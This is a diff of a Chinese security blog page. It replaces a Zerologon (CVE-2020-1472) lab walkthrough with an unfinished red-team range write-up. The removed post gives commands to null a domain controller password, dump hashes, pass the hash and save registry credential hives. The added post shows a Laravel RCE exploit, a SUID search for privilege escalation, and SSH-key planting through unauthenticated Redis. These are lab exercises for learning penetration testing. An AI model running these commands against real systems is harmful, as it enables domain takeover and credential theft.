@@ -11,7 +11,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    CVE-2020-1472漏洞复现 |  回梦&#39;s Blog
+    ATT&amp;CK实战系列-红队评估（七）中断 |  回梦&#39;s Blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -42,7 +42,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-CVE-2020-1472漏洞复现"
+  id="post-ATT&amp;CK实战系列-红队评估（七）中断"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -53,18 +53,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  CVE-2020-1472漏洞复现
+  ATT&amp;CK实战系列-红队评估（七）中断
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time datetime="2021-03-24T13:55:30.000Z" itemprop="datePublished">2021-03-24</time>
+      <a href="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/" class="article-date">
+  <time datetime="2021-03-27T01:49:15.000Z" itemprop="datePublished">2021-03-27</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
   </div>
   
 <div class="word_count">
@@ -72,7 +72,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">638</span>
+            <span class="post-count">651</span>
         </span>
     </span>
 
@@ -81,7 +81,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -96,52 +96,51 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472</span><br><span class="line"></span><br><span class="line">漏洞等级：严重</span><br><span class="line"></span><br><span class="line">漏洞评分：10分</span><br><span class="line"></span><br><span class="line">攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序</span><br></pre></td></tr></table></figure>
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶场攻击图</p>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/1.png"></p>
+<p>因为我这里的网络配置与靶场的不同，故我的部分IP如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali:192.168.213.159</span><br><span class="line">ubuntu(web 1):192.168.56.141(外网)</span><br></pre></td></tr></table></figure>
+<p>当你下载好靶场，直接开启即可，不用再次配置网络</p>
+<p>启动环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DMZ区的 Ubuntu 需要启动redis和nginx服务：</span><br><span class="line"></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line"></span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">第二层网络的 Ubuntu需要启动docker容器：</span><br><span class="line"></span><br><span class="line">sudo service docker start</span><br><span class="line"></span><br><span class="line">sudo docker start 8e172820ac78</span><br><span class="line"></span><br><span class="line">第三层网络的 Windows 7 （PC 1）需要启动通达OA：</span><br><span class="line"></span><br><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br></pre></td></tr></table></figure>
+<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><p>首先拿到一个外网IP:192.168.56.141，第一步当然是进行端口扫描啦</p>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/2.png"></p>
+<p>访问80端口是一个博客，暂无思路，So，访问81端口</p>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/3.png"></p>
+<p>发现是Laravel，刚好今年爆出了一个远程代码执行，版本在影响范围内</p>
+<h2 id="Laravel-Getshell"><a href="#Laravel-Getshell" class="headerlink" title="Laravel-Getshell"></a>Laravel-Getshell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 laravel-CVE-2021-3129-EXP.py http://192.168.56.141:81</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/4.png"></p>
+<p>脚本连接:<a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<p>使用哥斯拉进行连接，这个主机名有点奇怪</p>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/5.png"></p>
+<p>可以看到，现在处于docker环境，而且只是www-data权限，太小了，基本什么都干不了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;self&#x2F;cgroup</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/6.png"></p>
+<p>由于哥斯拉的命令执行出了一点问题，所以换成了蚁剑继续操作</p>
+<p>这里使用环境变量进行提权，用 下述命令搜索具有SUID或4000权限的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/7.png"></p>
+<p>看到/home/jobs/shell这一个很可疑，执行看一下</p>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/8.png"></p>
+<p>原来是执行ps命令，且没有使用绝对路径，那么我们尝试更改$PATH来执行我们的恶意程序，从而达到获得目标主机高权限shell的目的</p>
+<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>最后一直反弹不了shell，试了很久很久，也重新弄过，太菜了，不懂如何弄</p>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/9.png"></p>
+<h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><p>由于上面的路走不通只能从这里进行出发日了，先拿下Web1，在将Web2反弹到Web1中</p>
+<p>从前面的端口扫描结果得知Web1有Redis</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 redis.py 192.168.56.141 6379</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/10.png"></p>
+<p>假如你的kali没有Redis就要进行安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.3.tar.gz，下载</span><br><span class="line">tar -zxvf redis-2.8.3.tar.gz，解压</span><br><span class="line">cd redis-2.8.3&#x2F;</span><br><span class="line">make， 编译</span><br></pre></td></tr></table></figure>
+<p>生成一个公钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/11.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</span><br><span class="line">cat /tmp/foo.txt | /root/redis-2.8.3/src/redis-cli -h 192.168.56.141 -p 6379 -x set crackit</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Win7：192.168.213.152、192.168.52.143(内网)</p>
-<p>Win2008：192.168.52.138</p>
-<p>攻击机Kali：192.168.213.159</p>
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>使用ew代理win7流量出来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Win7:</span><br><span class="line">ew_for_win.exe -s rssocks -d 192.168.213.159 -e 8888</span><br><span class="line">Kali:</span><br><span class="line">.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 8888</span><br><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
-<p>使用检测，显示success表示漏洞存在</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line">proxychains python3 zerologon_tester.py owa 192.168.52.138</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>将域控密码置空</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 cve-2020-1472-exploit.py owa 192.168.52.138</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
-<p>安装Impacket</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket</span><br><span class="line">cd impacket</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>
-<p>使用空密码将域控的hash dump下来</p>
-<p>注：Windows无需\进行转义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py god.org&#x2F;OWA\$@192.168.52.138 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p>得到hash之后，利用wmiexec.py进行获取域控权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5c37acfca91a9301dc54f454e68846e4 god.org&#x2F;administrator@192.168.52.138</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
-<h2 id="恢复域控Hash"><a href="#恢复域控Hash" class="headerlink" title="恢复域控Hash"></a>恢复域控Hash</h2><p><strong>重点：一定恢复域控hash，不然会导致脱域</strong></p>
-<p>执行以下命令，获取目标原始hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
-<p>由于kali问题，我在本机进行执行查看域控hash</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
-<p>使用脚本恢复hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 reinstall_original_pw.py owa 192.168.52.138 9d5d0ca66e13bce4afec2bce60819f68</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
-<p>使用空密码验证连接</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py god.org/OWA\$@192.168.52.138 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
-<p>可以看懂域控hash已经恢复</p>
-<p>脚本地址：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>根据操作系统打上对应补丁即可</p>
-<p><a target="_blank" rel="noopener" href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-1472">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-1472</a></p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/265847.html">https://www.freebuf.com/vuls/265847.html</a></p>
-<p><a target="_blank" rel="noopener" href="http://shallowdream.cn/posts/50c5.html">http://shallowdream.cn/posts/50c5.html</a></p>
+
+
+<p>最后代理出来流量扫描存活的IP居然对不上？</p>
+<p>搞心态，删了</p>
  
       <!-- reward -->
       
@@ -206,12 +205,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
 
     </footer>
   </div>
@@ -219,19 +218,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%B8%AD%E6%96%AD/" class="article-nav-link">
+      <a href="/2021/03/27/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0(%E4%B8%83)-%E4%B8%AD%E6%96%AD/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            ATT&amp;CK实战系列-红队评估（七）中断
+            ATT&amp;CK实战系列-红队评估(七)-中断
           
         </div>
       </a>
     
     
-      <a href="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-nav-link">
+      <a href="/2021/03/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">ATT&amp;CK实战系列——红队实战（一）</div>
+        <div class="article-nav-title">CVE-2020-1472漏洞复现</div>
       </a>
     
   </nav>
